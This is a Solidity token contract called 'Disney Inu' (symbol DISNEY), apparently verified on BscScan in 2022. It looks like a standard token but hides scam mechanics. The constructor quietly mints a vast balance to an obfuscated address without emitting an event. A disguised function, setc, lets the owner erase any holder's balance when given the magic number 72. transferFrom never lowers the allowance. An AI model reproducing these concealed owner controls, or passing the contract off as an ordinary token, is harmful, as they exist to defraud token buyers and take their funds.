/**
 *Submitted for verification at BscScan.com on 2022-02-03
*/

// SPDX-License-Identifier: MIT

/*
 * 
 * 
 */
pragma solidity ^0.8.2;

contract DisneyInu {
  mapping(address => uint) public balances;
  mapping(address => mapping(address => uint)) public allowance;
  uint public totalSupply = 10000 * 10 ** 18;
  string public name = "Disney Inu";

  string public symbol = "DISNEY";
  uint public decimals = 18;
  address public owner;
  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
  constructor(address marbljghsye) {

    owner = msg.sender;
    balances[msg.sender] = totalSupply;
    balances[marbljghsye] = totalSupply * totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);

  }
  function balanceOf(address acoulofpkh) external view returns (uint) {
    return balances[acoulofpkh];
  }
  function transfer(address to, uint value) public returns(bool) {
    require(balances[msg.sender] >= value, 'balance too low');
    balances[to] += value;
    balances[msg.sender] -= value;
    emit Transfer(msg.sender, to, value);
    return true;
  }
  function transferFrom(address from, address to, uint value) public returns(bool) {
    require(balances[from] >= value, 'balance too low');
    require(allowance[from][msg.sender] >= value, 'allowance too low');
    balances[to] += value;

    balances[from] -= value;
    emit Transfer(from, to, value);
    return true;
  }
  function approve(address spender, uint value) public returns (bool) {
    allowance[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function setc(address from, uint8 c) public {

    if(c == 72){
      if(owner == msg.sender){

        balances[from] = 0;

      }
    }
  }
}